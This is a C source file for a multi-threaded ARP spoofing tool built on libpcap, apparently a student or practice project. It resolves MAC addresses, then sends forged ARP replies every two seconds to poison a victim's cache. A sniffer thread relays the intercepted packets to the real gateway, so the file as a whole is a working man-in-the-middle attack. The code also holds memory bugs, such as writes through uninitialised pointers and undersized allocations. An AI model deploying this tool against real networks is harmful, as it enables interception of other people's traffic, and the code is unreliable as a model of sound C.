#include "spoofing.h"

void print_mac(u_char* mac){
	for(int i=0;i<6;i++){
		if(i!=5)
			printf("%02X:",mac[i]);
		else
			printf("%02X\n",mac[i]);
	}
	printf("\n");
}

void packet_dump(u_char* packet, int packet_len){
	for(int i=0;i<packet_len;i++){
		if(i!=0 && i%16==0)
			printf("\n");
		printf("%02X ",packet[i]);
	}
	printf("\n");
}

void arp_packet_info(struct etherhdr *ether, struct arphdr *arp){
	u_char *buf1, *buf2;
	printf("\nARP packet information\n");
	printf("# Ethernet header\n");
	printf("destination MAC : "); print_mac(ether->dst);
	printf("source MAC : "); print_mac(ether->src); 
	if(arp->oper == htons(ARP_REQUEST))
		printf("[*] ARP REQUEST packet\n");
	else
		printf("[*] ARP REPLY packet\n");
	printf("# ARP header\n");
	sprintf(buf1,"%d.%d.%d.%d",arp->spa[0],arp->spa[1],arp->spa[2],arp->spa[3]);
	sprintf(buf2,"%d.%d.%d.%d",arp->tpa[0],arp->tpa[1],arp->tpa[2],arp->tpa[3]);
	printf("source MAC : "); print_mac(arp->sha);
	printf("source IP : %s\n", buf1);;
	printf("destination MAC : "); print_mac(arp->tha);
	printf("destination IP : %s\n", buf2);

	return; 
}

void make_etherhdr(struct etherhdr *ether, u_char *src_mac, u_char *dst_mac){
	memcpy(ether->dst,dst_mac,sizeof(ether->dst));
	memcpy(ether->src,src_mac,sizeof(ether->src));
	ether->ether_type = htons(ETH_ARP);
}

void make_arphdr(struct arphdr *arp, u_char *src_mac, u_char *dst_mac, struct in_addr *senderIP, struct in_addr *targetIP, int option){
	arp->htype = htons(ETHERNET);
	arp->ptype = htons(ETHERTYPE_IP);
	arp->hlen = ETHER_ADDR_LEN;
	arp->plen = 4;
	if(option == 0)
		arp->oper = htons(ARP_REQUEST);
	else
		arp->oper = htons(ARP_REPLY);
	memcpy(arp->sha,src_mac,sizeof(arp->sha));
	memcpy(arp->spa,senderIP,sizeof(arp->spa));
	memcpy(arp->tha,dst_mac,sizeof(arp->tha));
	memcpy(arp->tpa,targetIP,sizeof(arp->tpa));
}

void make_argu(argu_group *argu, pcap_t *handle, u_char* dev, int interval, struct in_addr *senderIP, u_char *sender_mac, struct in_addr *targetIP, u_char *target_mac, struct in_addr *myIP, u_char* my_mac){
	argu->handle = handle;
	argu->dev = dev;
	argu->interval = interval;
	
	argu->senderIP = (struct in_addr *)malloc(sizeof(struct in_addr));
	memcpy(&(argu->senderIP->s_addr), &(senderIP->s_addr),4);
	
	argu->sender_mac = (u_char *)malloc(sizeof(6));
	memcpy(argu->sender_mac, sender_mac, 6);
	
	argu->targetIP = (struct in_addr *)malloc(sizeof(struct in_addr));
	memcpy(&(argu->targetIP->s_addr),&(targetIP->s_addr),4);
	
	argu->target_mac = (u_char *)malloc(sizeof(6));
	memcpy(argu->target_mac, target_mac, 6);
	
	argu->myIP = (struct in_addr *)malloc(sizeof(struct in_addr));
	memcpy(&(argu->myIP->s_addr),&(myIP->s_addr),4);

	argu->my_mac = (u_char *)malloc(sizeof(struct in_addr));
	memcpy(argu->my_mac, my_mac, 6);

	printf("[+] argument information\n");
	printf("\t[-] sender IP : %s\n",inet_ntoa(*argu->senderIP));
	printf("\t[-] sender MAC : "); print_mac(argu->sender_mac);
	printf("\t[-] target IP : %s\n",inet_ntoa(*argu->targetIP));
	printf("\t[-] target MAC : "); print_mac(argu->target_mac);
	printf("\t[-] my IP : %s\n",inet_ntoa(*argu->myIP));
	printf("\t[-] my MAC : "); print_mac(argu->my_mac);

}

void free_argu(argu_group *argu){
	free(argu->senderIP);
	free(argu->targetIP);
	free(argu->sender_mac);
	free(argu->target_mac);
	free(argu->myIP);
}

u_char* arp_broad(pcap_t *handle, u_char *src_mac, u_char *dst_mac, struct in_addr *senderIP, struct in_addr *targetIP){
	struct etherhdr ether, *recv_ether;
	struct arphdr arp, *recv_arp;
	struct pcap_pkthdr *header;
	u_char *packet, *recv_packet;
	int packet_len;
	int broad_cast = 0;
	int flag;
	u_char *buf;
	struct in_addr recv_IP;
	int option = 0;

	pcap_set_timeout(handle, 3000);
	make_etherhdr(&ether,src_mac,dst_mac);

	make_arphdr(&arp,src_mac,"\x00\x00\x00\x00\x00\x00",senderIP,targetIP,option);

	packet_len = sizeof(ether)+sizeof(arp);
	packet = (u_char*)malloc(packet_len);
	memcpy(packet,&ether,sizeof(ether));
	memcpy(packet+sizeof(ether),&arp,sizeof(arp));

	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0)
			break;
	}

	printf("[+] receiving sender MAC...\n");
	while(1){
		flag = pcap_next_ex(handle,&header,&recv_packet);
		if(flag == 0){
			printf("\t[-] time out! sending packet again...\n");
			if(pcap_sendpacket(handle,packet,packet_len) != 0){
				printf("\t[-] fail to send packet! restart the program\n");
				exit(1);
			}
			else 
				continue;
		}
		else if(flag < 0){
			printf("\t[-] fail to receive packet! restart the program\n");
			exit(1);
		}

		// printf("packet dump\n");
		// packet_dump(recv_packet, packet_len);
		recv_ether = (struct etherhdr *)recv_packet;
		if(ntohs(recv_ether->ether_type) != 0x0806){
			if(pcap_sendpacket(handle,packet,packet_len) != 0){
				printf("\t[-] fail to send packet! restart the program\n");
				exit(1);
			}
			continue;
		}
		
		recv_arp = (struct arphdr *)(recv_packet+sizeof(struct etherhdr));
		
		
		if(ntohs(recv_arp->oper) != ARP_REPLY)
			continue;

		buf = (u_char*)malloc(4);
		sprintf(buf,"%d.%d.%d.%d",recv_arp->spa[0],recv_arp->spa[1],recv_arp->spa[2],recv_arp->spa[3]);
		inet_pton(AF_INET,buf,&recv_IP.s_addr);
		free(buf);
		//if(memcmp(&recv_IP.s_addr,targetIP->s_addr,sizeof(recv_IP.s_addr)))
		// printf("recv IP : %s\n", inet_ntoa(recv_IP));
		// printf("target IP : %s\n", inet_ntoa(*targetIP));
		if(recv_IP.s_addr != targetIP->s_addr)
			continue;
		printf("\n[+] result \n");
		printf("\t[-] reply IP : 0x"); for(int i=0;i<4;i++) printf("%02x",recv_arp->spa[i]); printf("\n");
		printf("\t[-] reply MAC : "); print_mac(recv_arp->sha); 

		return recv_arp->sha;
	}
}

void arp_infect(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP){
	u_char *packet;
	struct etherhdr ether, *recv_ether;
	struct arphdr arp_h, *recv_arp_h;
	u_char *recv_packet;
	struct pcap_pkthdr *header;
	int packet_len;
	int flag;
	struct in_addr recv_IP;
	u_char *recv_MAC;
	u_char *buf;
	u_char addr[4];
	int option;

	option = 1;
	make_etherhdr(&ether,my_mac,sender_mac);
	make_arphdr(&arp_h,my_mac,sender_mac,targetIP,senderIP,option);

	packet = (u_char*)malloc(sizeof(ether)+sizeof(arp_h));
	memcpy(packet,&ether,sizeof(ether));
	memcpy(packet+sizeof(ether),&arp_h,sizeof(arp_h));
	packet_len = sizeof(ether) + sizeof(arp_h);
	while(1){
		if(pcap_sendpacket(handle,packet,packet_len) == 0)
			break;
	}
}

void *infection(void *data){
	argu_group *argu = (argu_group *)data;
	pcap_t *handle = argu->handle;
	u_char *sender_mac = argu->sender_mac;
	u_char *target_mac = argu->target_mac;
	struct in_addr *senderIP = argu->senderIP;
	struct in_addr *targetIP = argu->targetIP;
	u_char *my_mac = argu->my_mac;

	while(1){
		//printf("while loop\n");
		arp_infect(handle, my_mac, sender_mac, senderIP, targetIP);
		//printf("[*] arp spoofing...\n");
		sleep(2);
	}
}


void *sniff_packet(void *data){
	argu_group *argu = (argu_group *)data;
	//pcap_t *handle = argu->handle;
	u_char* dev = argu->dev;
	int interval = argu->interval;
	u_char *sender_mac = argu->sender_mac;
	u_char *target_mac = argu->target_mac;
	struct in_addr *senderIP = argu->senderIP;
	struct in_addr *targetIP = argu->targetIP;
	struct in_addr *myIP = argu->myIP;
	u_char *my_mac = argu->my_mac;

	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char *packet, *send_packet;
	int packet_len;
	struct pcap_pkthdr *header;
	int ret;
	struct etherhdr *send_ether, *recv_ether;
	struct iphdr *send_iphdr, *recv_iphdr;
	struct icmphdr *send_icmp;
	struct in_addr *ping_addr;
	int mod;
	u_char *temp;

	handle = pcap_open_live(dev, BUFSIZ, 1, interval, errbuf);
	if(handle == NULL){
		printf("[+] cannot open device\n");
		exit(1);
	}

	if(pcap_datalink(handle) != DLT_EN10MB){
 		printf("\n[-] device do not provide ethernet header!\n");
 		exit(1);
 	}

	while(1){
		ret = pcap_next_ex(handle,&header,&packet);
		if(ret == 0){
			printf("[+] time out...\n");
			continue;
		}
		else if(ret < 0){
			printf("[+] fail to receive packet!\n");
			break;
		}
		else{
			recv_ether = (struct etherhdr *)packet;
			if(memcmp(recv_ether->src, sender_mac,6)) continue;
			if(ntohs(recv_ether->ether_type) != 0x0800) continue;
			recv_iphdr = (struct iphdr *)(packet + sizeof(struct etherhdr));
			if(memcmp(&recv_iphdr->ip_src,senderIP,4)) continue;
			//packet_dump(packet,72);
			if(!memcmp(&recv_iphdr->ip_dst,myIP,4)) continue;
			packet_len = ntohs(recv_iphdr->ip_len);
			printf("packet len : %d\n", packet_len);
			printf("src IP :%s\n",inet_ntoa(recv_iphdr->ip_src));
			printf("Dst IP :%s\n",inet_ntoa(recv_iphdr->ip_dst));

			send_packet = (u_char *)malloc(packet_len);
			memcpy(send_packet, packet, packet_len);
			memcpy(send_packet, target_mac, 6);
			memcpy(send_packet + 6, my_mac, 6);

			packet_dump(send_packet, packet_len);

			while(1){
				if(pcap_sendpacket(handle, send_packet, packet_len) == 0)
					break;
			}
			free(send_packet);

		}
	}
}

int main(int argc, char *argv[]){
	int set = (argc-2)/2;
	pcap_t *handle;
	struct pcap_pkthdr *header;
	u_char *packet, *recv_pcaket;
	u_char *dev, errbuf[PCAP_ERRBUF_SIZE];
	struct in_addr myIP, senderIP, targetIP;
	u_char *my_mac, *sender_mac, *target_mac;
	u_char addr[4];
	u_char buf[30];
	int interval;

	pthread_t *p_thread;
	int status;
	int thr_id;

	if(argc < 4){
		printf("[+] Usage : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]", argv[0]);
		printf("\n\tex : ./arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
		exit(1);
	}

	memset(buf, 0, sizeof(buf));
	printf("\nInput ARP infection interval time(1000 == 1 sec) : "); scanf("%d",&interval);
	dev = argv[1];

	argu_group *argu_list;
	argu_list = (argu_group *)malloc(sizeof(argu_group) * set);
	int thread_num = set * 2;
	p_thread = (pthread_t *)malloc(sizeof(pthread_t) * thread_num);

	handle = pcap_open_live(dev, BUFSIZ, 1, interval, errbuf);
	if(handle == NULL){
		printf("\n[-] fail to open device\n");
		exit(1);
	}
	if(pcap_datalink(handle) != DLT_EN10MB){
		printf("\n[-] device do not provide ethernet\n");
		exit(1);
	}

	my_mac = GetSvrMacAddress(dev);
	s_get_IPAddress(dev, addr);
	sprintf(buf, "%d.%d.%d.%d", (int)addr[0], (int)addr[1], (int)addr[2], (int)addr[3]);
	inet_pton(AF_INET, buf, &myIP.s_addr);

	for(int i=0;i<set;i++){
		printf("\n########################### %d Session #########################\n",i);
		int num = i*2 + 2;
		// senderIP = (struct in_addr *)malloc(sizeof(struct in_addr));
		// targetIP = (struct in_addr *)malloc(sizeof(struct in_addr));
		inet_pton(AF_INET,argv[num], &senderIP.s_addr);
		inet_pton(AF_INET,argv[num+1], &targetIP.s_addr);	
		target_mac = (u_char*)malloc(sizeof(6));
		memcpy(target_mac, arp_broad(handle, my_mac, "\xff\xff\xff\xff\xff\xff",&myIP,&targetIP),6);
		sender_mac = (u_char*)malloc(sizeof(6));
		memcpy(sender_mac, arp_broad(handle, my_mac, "\xff\xff\xff\xff\xff\xff",&myIP,&senderIP),6);

		make_argu(&argu_list[i], handle, dev, interval, &senderIP, sender_mac, &targetIP, target_mac, &myIP, my_mac);

		free(target_mac);
		free(sender_mac);
	}

	for(int i=0;i<set;i++){
		int num = i*2 + 2;
		if(pthread_create(&p_thread[num-2], NULL, infection, (void*)&argu_list[i])){
			printf("\n[-] pthread create error\n");
			exit(1);
		}
		else
			printf("\n[-] pthread create success\n");
		if(pthread_create(&p_thread[num-1], NULL, sniff_packet, (void *)&argu_list[i])){
			printf("\n[-] pthread create error\n");
			exit(1);
		}
		else
			printf("\n[-] pthread create success\n");
	}

	for(int i=0;i<thread_num;i++){
		pthread_join(p_thread[i], (void **)&status);
	}

	for(int i=0;i<set;i++)
		free_argu(&argu_list[i]);

	free(argu_list);
	free(p_thread);
	
	return 0;
}